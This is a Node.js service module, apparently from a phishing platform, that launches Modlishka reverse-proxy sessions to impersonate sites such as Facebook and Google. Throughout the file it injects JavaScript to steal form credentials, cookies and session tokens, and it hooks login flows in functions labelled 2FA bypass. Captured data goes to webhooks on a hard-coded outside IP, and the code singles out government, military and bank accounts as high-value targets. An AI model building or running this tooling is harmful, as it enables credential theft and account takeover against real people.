const { spawn, exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const db = require('../database');

class ModlishkaService {
  constructor() {
    this.activeSessions = new Map(); // sessionId -> process info
    this.configurations = new Map(); // sessionId -> config data
    this.capturedCredentials = new Map(); // sessionId -> credentials
    this.capturedCookies = new Map(); // sessionId -> cookies
    this.modlishkaBinary = path.join(__dirname, '../../modlishka');
    this.configsDir = path.join(__dirname, '../temp/modlishka-configs');
    this.logsDir = path.join(__dirname, '../temp/modlishka-logs');
    
    // Ensure directories exist
    this.ensureDirectories();
  }

  /**
   * Ensure required directories exist for Modlishka configs and logs
   */
  ensureDirectories() {
    [this.configsDir, this.logsDir].forEach(dir => {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
    });
  }

  /**
   * Create a new Modlishka phishing session
   * @param {number} campaignId - Campaign ID
   * @param {string} targetDomain - Target domain to phish (e.g., 'facebook.com')
   * @param {object} options - Configuration options
   * @returns {Promise<Object>} Session details with phishing URL
   */
  async createPhishingSession(campaignId, targetDomain, options = {}) {
    try {
      const sessionId = crypto.randomBytes(16).toString('hex');
      const sessionToken = `mod_${sessionId}`;
      
      // Generate unique ports for this session
      const httpsPort = await this.findAvailablePort(8443);
      const httpPort = await this.findAvailablePort(8080);
      
      // Create SSL certificates for HTTPS
      const certInfo = await this.generateSSLCertificates(sessionId, targetDomain);
      
      // Generate Modlishka configuration
      const config = this.generateModlishkaConfig({
        sessionId,
        targetDomain,
        httpsPort,
        httpPort,
        certInfo,
        campaignId,
        ...options
      });
      
      // Save configuration file
      const configPath = path.join(this.configsDir, `${sessionId}.json`);
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
      
      // Store session in database
      const dbSessionId = await this.storeSessionInDatabase(campaignId, sessionId, config);
      
      // Start Modlishka process
      const process = await this.startModlishkaProcess(sessionId, configPath);
      
      // Store session data
      const sessionData = {
        sessionId: dbSessionId,
        sessionToken,
        campaignId,
        targetDomain,
        httpsPort,
        httpPort,
        process,
        configPath,
        config,
        startTime: new Date(),
        status: 'active'
      };
      
      this.activeSessions.set(sessionId, sessionData);
      this.configurations.set(sessionId, config);
      
      // Generate phishing URLs
      const phishingUrls = this.generatePhishingUrls(targetDomain, httpsPort, httpPort);
      
      console.log(`🎣 Modlishka session created: ${sessionId}`);
      console.log(`🌐 Phishing URL: ${phishingUrls.https}`);
      console.log(`🎯 Target: ${targetDomain}`);
      
      return {
        sessionId: dbSessionId,
        sessionToken,
        phishingUrls,
        targetDomain,
        httpsPort,
        httpPort,
        trackingUrl: this.generateTrackingUrl(sessionToken)
      };
      
    } catch (error) {
      console.error('Error creating Modlishka session:', error);
      throw error;
    }
  }

  /**
   * Generate SSL certificates for HTTPS phishing
   */
  async generateSSLCertificates(sessionId, targetDomain) {
    const certDir = path.join(this.configsDir, 'certs', sessionId);
    if (!fs.existsSync(certDir)) {
      fs.mkdirSync(certDir, { recursive: true });
    }
    
    const keyPath = path.join(certDir, 'server.key');
    const certPath = path.join(certDir, 'server.crt');
    
    // Generate self-signed certificate using OpenSSL
    const opensslCommand = `openssl req -x509 -newkey rsa:2048 -keyout ${keyPath} -out ${certPath} -days 365 -nodes -subj "/C=US/ST=CA/L=SF/O=Acme/OU=IT/CN=*.${targetDomain}"`;
    
    return new Promise((resolve, reject) => {
      exec(opensslCommand, (error) => {
        if (error) {
          console.warn('OpenSSL not available, using Modlishka auto-generated certs');
          resolve({ keyPath: null, certPath: null });
        } else {
          console.log(`✅ SSL certificates generated for ${targetDomain}`);
          resolve({ keyPath, certPath });
        }
      });
    });
  }

  /**
   * Generate Modlishka configuration for advanced phishing
   */
  generateModlishkaConfig({ sessionId, targetDomain, httpsPort, httpPort, certInfo, campaignId, options = {} }) {
    const config = {
      // Core Modlishka settings
      proxyDomain: options.proxyDomain || `${targetDomain.replace('.', '-')}.tk`,
      listeningAddress: '0.0.0.0',
      target: `https://${targetDomain}`,
      targetRes: options.targetRes || '',
      
      // Port configuration
      listeningPort: httpsPort,
      httpPort: httpPort,
      
      // SSL/TLS settings
      TLSCertificate: certInfo.certPath,
      TLSKey: certInfo.keyPath,
      
      // Advanced evasion and stealth settings
      disableSecurity: false,
      dynamicMode: true,
      debug: false,
      logPostOnly: false,
      
      // Rules for credential capture
      jsRules: options.jsRules || this.getDefaultJSRules(targetDomain),
      
      // Termination rules (redirect after successful login)
      terminateRedirectUrl: options.redirectUrl || `https://${targetDomain}`,
      terminateUrl: options.terminateUrl || '/terminate',
      
      // Advanced 2FA bypass settings
      trackingCookie: `_fstrike_${sessionId}`,
      trackingParam: `_fstrike_track`,
      
      // Plugin configuration for enhanced functionality
      plugins: this.getPluginConfiguration(targetDomain, campaignId),
      
      // Log settings
      log: path.join(this.logsDir, `${sessionId}.log`),
      credLog: path.join(this.logsDir, `${sessionId}_creds.log`),
      
      // FStrike integration settings
      fstrike: {
        sessionId,
        campaignId,
        webhookUrl: `http://147.93.87.182:5000/api/modlishka/webhook/${sessionId}`,
        trackingUrl: `http://147.93.87.182:5000/api/track-modlishka/${sessionId}`
      }
    };
    
    return config;
  }

  /**
   * Get default JavaScript rules for credential capture based on target domain
   */
  getDefaultJSRules(targetDomain) {
    const commonRules = {
      // Universal credential capture
      'document.addEventListener("submit"': `
        document.addEventListener("submit", function(e) {
          var form = e.target;
          var data = {};
          var inputs = form.querySelectorAll('input');
          inputs.forEach(function(input) {
            if (input.name && input.value && input.type !== 'submit' && input.type !== 'button') {
              data[input.name] = input.value;
            }
          });
          
          if (Object.keys(data).length > 0) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/fstrike-capture', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
              type: 'form_submit',
              url: location.href,
              data: data,
              timestamp: Date.now()
            }));
          }
        }, true);
      `,
      
      // Advanced cookie capture
      'document.cookie': `
        var originalCookie = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') || 
                            Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
        
        Object.defineProperty(document, 'cookie', {
          get: function() {
            return originalCookie.get.call(this);
          },
          set: function(val) {
            // Capture cookie setting
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/fstrike-capture', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
              type: 'cookie_set',
              cookie: val,
              url: location.href,
              timestamp: Date.now()
            }));
            
            return originalCookie.set.call(this, val);
          }
        });
      `
    };

    // Domain-specific rules
    if (targetDomain.includes('facebook.com')) {
      return {
        ...commonRules,
        'Facebook 2FA Bypass': `
          // Facebook-specific 2FA and session capture
          if (window.require && window.require.__d) {
            // Hook into Facebook's module system
            var originalDefine = window.require.__d;
            window.require.__d = function(name, deps, factory) {
              if (name && name.includes('LoginForm') || name.includes('TwoFactor')) {
                var result = originalDefine.apply(this, arguments);
                // Capture Facebook auth tokens
                setTimeout(function() {
                  var authTokens = {};
                  try {
                    authTokens.datr = document.cookie.match(/datr=([^;]+)/)?.[1];
                    authTokens.c_user = document.cookie.match(/c_user=([^;]+)/)?.[1];
                    authTokens.xs = document.cookie.match(/xs=([^;]+)/)?.[1];
                    
                    if (authTokens.c_user) {
                      var xhr = new XMLHttpRequest();
                      xhr.open('POST', '/fstrike-capture', true);
                      xhr.setRequestHeader('Content-Type', 'application/json');
                      xhr.send(JSON.stringify({
                        type: 'facebook_auth',
                        tokens: authTokens,
                        url: location.href,
                        timestamp: Date.now()
                      }));
                    }
                  } catch(e) {}
                }, 1000);
                return result;
              }
              return originalDefine.apply(this, arguments);
            };
          }
        `
      };
    }

    if (targetDomain.includes('google.com') || targetDomain.includes('gmail.com')) {
      return {
        ...commonRules,
        'Google 2FA Bypass': `
          // Google-specific 2FA capture
          var originalFetch = window.fetch;
          window.fetch = function() {
            var args = arguments;
            var url = args[0];
            
            if (typeof url === 'string' && (url.includes('signin') || url.includes('2fa') || url.includes('totp'))) {
              var promise = originalFetch.apply(this, args);
              promise.then(function(response) {
                if (response.ok) {
                  // Capture successful authentication
                  var xhr = new XMLHttpRequest();
                  xhr.open('POST', '/fstrike-capture', true);
                  xhr.setRequestHeader('Content-Type', 'application/json');
                  xhr.send(JSON.stringify({
                    type: 'google_auth_success',
                    url: response.url,
                    cookies: document.cookie,
                    timestamp: Date.now()
                  }));
                }
              });
              return promise;
            }
            
            return originalFetch.apply(this, args);
          };
        `
      };
    }

    return commonRules;
  }

  /**
   * Get plugin configuration for enhanced functionality
   */
  getPluginConfiguration(targetDomain, campaignId) {
    return {
      // Cookie capture plugin
      cookieCapture: {
        enabled: true,
        captureAll: true,
        sensitive: ['session', 'auth', 'token', 'login', 'user', 'csrf'],
        webhook: `http://147.93.87.182:5000/api/modlishka/cookies/${campaignId}`
      },
      
      // Credential capture plugin
      credentialCapture: {
        enabled: true,
        forms: true,
        ajax: true,
        websockets: true,
        webhook: `http://147.93.87.182:5000/api/modlishka/credentials/${campaignId}`
      },
      
      // 2FA bypass plugin
      twoFactorBypass: {
        enabled: true,
        methods: ['totp', 'sms', 'push', 'backup'],
        sessionPersistence: true,
        webhook: `http://147.93.87.182:5000/api/modlishka/2fa/${campaignId}`
      },
      
      // Session hijacking plugin
      sessionHijacking: {
        enabled: true,
        autoLogin: false, // Don't auto-login to avoid detection
        persistSessions: true,
        webhook: `http://147.93.87.182:5000/api/modlishka/sessions/${campaignId}`
      }
    };
  }

  /**
   * Start Modlishka process with configuration
   */
  async startModlishkaProcess(sessionId, configPath) {
    return new Promise((resolve, reject) => {
      const logPath = path.join(this.logsDir, `${sessionId}_process.log`);
      const logStream = fs.createWriteStream(logPath, { flags: 'a' });
      
      const args = [
        '-config', configPath,
        '-debug', 'false',
        '-log', path.join(this.logsDir, `${sessionId}.log`)
      ];
      
      console.log(`🚀 Starting Modlishka process for session: ${sessionId}`);
      console.log(`📋 Command: ${this.modlishkaBinary} ${args.join(' ')}`);
      
      const process = spawn(this.modlishkaBinary, args, {
        detached: false,
        stdio: ['ignore', 'pipe', 'pipe']
      });
      
      process.stdout.pipe(logStream);
      process.stderr.pipe(logStream);
      
      process.on('error', (error) => {
        console.error(`❌ Modlishka process error for ${sessionId}:`, error);
        reject(error);
      });
      
      process.on('exit', (code, signal) => {
        console.log(`🔚 Modlishka process ${sessionId} exited with code ${code}, signal ${signal}`);
        this.activeSessions.delete(sessionId);
      });
      
      // Give the process time to start
      setTimeout(() => {
        if (process.killed) {
          reject(new Error('Modlishka process failed to start'));
        } else {
          console.log(`✅ Modlishka process started for session: ${sessionId} (PID: ${process.pid})`);
          resolve(process);
        }
      }, 2000);
    });
  }

  /**
   * Find an available port starting from the given port
   */
  async findAvailablePort(startPort) {
    const net = require('net');
    
    return new Promise((resolve) => {
      const server = net.createServer();
      server.listen(startPort, () => {
        const port = server.address().port;
        server.close(() => resolve(port));
      });
      
      server.on('error', () => {
        resolve(this.findAvailablePort(startPort + 1));
      });
    });
  }

  /**
   * Generate phishing URLs for the session
   */
  generatePhishingUrls(targetDomain, httpsPort, httpPort) {
    const serverIp = '147.93.87.182';
    
    return {
      https: `https://${serverIp}:${httpsPort}`,
      http: `http://${serverIp}:${httpPort}`,
      // Alternative URLs with domain spoofing
      spoofed: {
        https: `https://${targetDomain.replace('.', '-')}.tk:${httpsPort}`,
        http: `http://${targetDomain.replace('.', '-')}.tk:${httpPort}`
      }
    };
  }

  /**
   * Generate tracking URL for email campaigns
   */
  generateTrackingUrl(sessionToken) {
    return `http://147.93.87.182:5000/api/track-modlishka/${sessionToken}`;
  }

  /**
   * Store session in database
   */
  async storeSessionInDatabase(campaignId, sessionId, config) {
    return new Promise((resolve, reject) => {
      db.run(
        `INSERT INTO modlishka_sessions 
         (campaign_id, session_token, target_domain, config_data, status, created_at) 
         VALUES (?, ?, ?, ?, ?, datetime('now'))`,
        [campaignId, sessionId, config.target, JSON.stringify(config), 'active'],
        function(err) {
          if (err) {
            console.error('Error storing Modlishka session:', err);
            reject(err);
          } else {
            console.log(`💾 Modlishka session stored in database with ID: ${this.lastID}`);
            resolve(this.lastID);
          }
        }
      );
    });
  }

  /**
   * Stop a Modlishka session
   */
  async stopSession(sessionId) {
    try {
      const session = this.activeSessions.get(sessionId);
      if (!session) {
        throw new Error(`Session ${sessionId} not found`);
      }
      
      // Kill the Modlishka process
      if (session.process && !session.process.killed) {
        session.process.kill('SIGTERM');
        console.log(`🛑 Stopped Modlishka process for session: ${sessionId}`);
      }
      
      // Update database
      await new Promise((resolve, reject) => {
        db.run(
          'UPDATE modlishka_sessions SET status = ?, stopped_at = datetime("now") WHERE session_token = ?',
          ['stopped', sessionId],
          (err) => err ? reject(err) : resolve()
        );
      });
      
      // Clean up
      this.activeSessions.delete(sessionId);
      this.configurations.delete(sessionId);
      
      // Clean up config file
      if (session.configPath && fs.existsSync(session.configPath)) {
        fs.unlinkSync(session.configPath);
      }
      
      console.log(`✅ Session ${sessionId} stopped successfully`);
      
    } catch (error) {
      console.error(`Error stopping session ${sessionId}:`, error);
      throw error;
    }
  }

  /**
   * Get captured credentials for a session
   */
  async getCapturedCredentials(sessionId) {
    return new Promise((resolve, reject) => {
      db.all(
        'SELECT * FROM modlishka_captures WHERE session_token = ? AND type = ? ORDER BY timestamp DESC',
        [sessionId, 'credentials'],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows);
        }
      );
    });
  }

  /**
   * Get captured cookies for a session
   */
  async getCapturedCookies(sessionId) {
    return new Promise((resolve, reject) => {
      db.all(
        'SELECT * FROM modlishka_captures WHERE session_token = ? AND type = ? ORDER BY timestamp DESC',
        [sessionId, 'cookies'],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows);
        }
      );
    });
  }

  /**
   * Get captured 2FA tokens for a session
   */
  async getCaptured2FA(sessionId) {
    return new Promise((resolve, reject) => {
      db.all(
        'SELECT * FROM modlishka_captures WHERE session_token = ? AND type = ? ORDER BY timestamp DESC',
        [sessionId, '2fa'],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows);
        }
      );
    });
  }

  /**
   * Get all active sessions
   */
  getActiveSessions() {
    const sessions = [];
    for (const [sessionId, data] of this.activeSessions.entries()) {
      sessions.push({
        sessionId,
        sessionToken: data.sessionToken,
        campaignId: data.campaignId,
        targetDomain: data.targetDomain,
        phishingUrls: this.generatePhishingUrls(data.targetDomain, data.httpsPort, data.httpPort),
        startTime: data.startTime,
        status: data.status
      });
    }
    return sessions;
  }

  /**
   * Handle webhook data from Modlishka
   */
  async handleWebhookData(sessionId, type, data) {
    try {
      console.log(`📥 Webhook data received for session ${sessionId}, type: ${type}`);
      
      // Store capture in database
      await new Promise((resolve, reject) => {
        db.run(
          `INSERT INTO modlishka_captures 
           (session_token, type, data, ip_address, user_agent, timestamp) 
           VALUES (?, ?, ?, ?, ?, datetime('now'))`,
          [sessionId, type, JSON.stringify(data), data.ip || '', data.userAgent || ''],
          function(err) {
            if (err) reject(err);
            else resolve(this.lastID);
          }
        );
      });
      
      // Process specific types of captures
      switch (type) {
        case 'credentials':
          await this.processCredentialCapture(sessionId, data);
          break;
        case 'cookies':
          await this.processCookieCapture(sessionId, data);
          break;
        case '2fa':
          await this.process2FACapture(sessionId, data);
          break;
        case 'session':
          await this.processSessionCapture(sessionId, data);
          break;
      }
      
    } catch (error) {
      console.error(`Error handling webhook data for session ${sessionId}:`, error);
    }
  }

  /**
   * Process captured credentials
   */
  async processCredentialCapture(sessionId, data) {
    console.log(`🔑 Credentials captured for session ${sessionId}:`, data);
    
    // Associate with email campaign if tracking info available
    if (data.trackingId) {
      await this.associateWithEmailRecipient(sessionId, data.trackingId, data);
    }
    
    // Notify if high-value target
    if (this.isHighValueTarget(data)) {
      console.log(`🎯 HIGH-VALUE TARGET: ${data.email || data.username}`);
    }
  }

  /**
   * Process captured cookies
   */
  async processCookieCapture(sessionId, data) {
    console.log(`🍪 Cookies captured for session ${sessionId}`);
    
    // Check for session cookies that indicate successful bypass
    const sessionCookies = this.extractSessionCookies(data.cookies);
    if (sessionCookies.length > 0) {
      console.log(`✅ Session cookies captured - 2FA bypass successful!`);
    }
  }

  /**
   * Process captured 2FA tokens
   */
  async process2FACapture(sessionId, data) {
    console.log(`🔐 2FA tokens captured for session ${sessionId}:`, data);
    
    // Log successful 2FA bypass
    console.log(`🎉 2FA BYPASS SUCCESSFUL for session ${sessionId}!`);
  }

  /**
   * Process captured session data
   */
  async processSessionCapture(sessionId, data) {
    console.log(`📱 Session data captured for session ${sessionId}`);
  }

  /**
   * Check if target is high-value based on email domain or username
   */
  isHighValueTarget(data) {
    const highValueDomains = [
      'gov.', 'mil.', 'edu.', '.bank', '.finance',
      'admin', 'root', 'ceo', 'cto', 'president'
    ];
    
    const email = data.email || '';
    const username = data.username || '';
    
    return highValueDomains.some(domain => 
      email.toLowerCase().includes(domain) || 
      username.toLowerCase().includes(domain)
    );
  }

  /**
   * Extract important session cookies
   */
  extractSessionCookies(cookies) {
    const sessionCookieNames = [
      'session', 'sessid', 'sid', 'auth', 'token', 'login',
      'user', 'account', 'csrf', 'xsrf', 'c_user', 'xs', 'datr'
    ];
    
    return cookies.filter(cookie => 
      sessionCookieNames.some(name => 
        cookie.name.toLowerCase().includes(name)
      )
    );
  }

  /**
   * Associate capture with email recipient
   */
  async associateWithEmailRecipient(sessionId, trackingId, data) {
    try {
      const emailInfo = await new Promise((resolve, reject) => {
        db.get(
          'SELECT user_email, campaign_id FROM tracking_pixels WHERE id = ?',
          [trackingId],
          (err, row) => err ? reject(err) : resolve(row)
        );
      });
      
      if (emailInfo) {
        console.log(`📧 Capture associated with email: ${emailInfo.user_email}`);
        
        // Update capture record with email association
        await new Promise((resolve, reject) => {
          db.run(
            'UPDATE modlishka_captures SET target_email = ? WHERE session_token = ? AND timestamp = (SELECT MAX(timestamp) FROM modlishka_captures WHERE session_token = ?)',
            [emailInfo.user_email, sessionId, sessionId],
            (err) => err ? reject(err) : resolve()
          );
        });
      }
    } catch (error) {
      console.error('Error associating capture with email:', error);
    }
  }

  /**
   * Get session statistics for a campaign
   */
  async getSessionStats(campaignId) {
    return new Promise((resolve, reject) => {
      const sql = `
        SELECT 
          ms.id,
          ms.session_token,
          ms.target_domain,
          ms.status,
          ms.created_at,
          ms.stopped_at,
          COUNT(CASE WHEN mc.type = 'credentials' THEN 1 END) as credentials_count,
          COUNT(CASE WHEN mc.type = 'cookies' THEN 1 END) as cookies_count,
          COUNT(CASE WHEN mc.type = '2fa' THEN 1 END) as twofa_count,
          COUNT(CASE WHEN mc.type = 'access' THEN 1 END) as access_count,
          COUNT(DISTINCT mc.ip_address) as unique_visitors
        FROM modlishka_sessions ms
        LEFT JOIN modlishka_captures mc ON ms.session_token = mc.session_token
        WHERE ms.campaign_id = ?
        GROUP BY ms.id, ms.session_token, ms.target_domain, ms.status, ms.created_at, ms.stopped_at
        ORDER BY ms.created_at DESC
      `;
      
      db.all(sql, [campaignId], (err, rows) => {
        if (err) {
          reject(err);
        } else {
          resolve(rows);
        }
      });
    });
  }

  /**
   * Initialize database tables for Modlishka
   */
  async initializeDatabase() {
    return new Promise((resolve, reject) => {
      const sql = `
        CREATE TABLE IF NOT EXISTS modlishka_sessions (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          campaign_id INTEGER NOT NULL,
          session_token TEXT UNIQUE NOT NULL,
          target_domain TEXT NOT NULL,
          config_data TEXT NOT NULL,
          status TEXT DEFAULT 'active',
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          stopped_at DATETIME,
          FOREIGN KEY (campaign_id) REFERENCES campaigns (id)
        );
        
        CREATE TABLE IF NOT EXISTS modlishka_captures (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          session_token TEXT NOT NULL,
          type TEXT NOT NULL,
          data TEXT NOT NULL,
          target_email TEXT,
          ip_address TEXT,
          user_agent TEXT,
          timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
          FOREIGN KEY (session_token) REFERENCES modlishka_sessions (session_token)
        );
        
        CREATE INDEX IF NOT EXISTS idx_modlishka_session_token ON modlishka_captures(session_token);
        CREATE INDEX IF NOT EXISTS idx_modlishka_type ON modlishka_captures(type);
        CREATE INDEX IF NOT EXISTS idx_modlishka_timestamp ON modlishka_captures(timestamp);
      `;
      
      db.exec(sql, (err) => {
        if (err) {
          console.error('Error initializing Modlishka database:', err);
          reject(err);
        } else {
          console.log('✅ Modlishka database tables initialized');
          resolve();
        }
      });
    });
  }
}

module.exports = new ModlishkaService();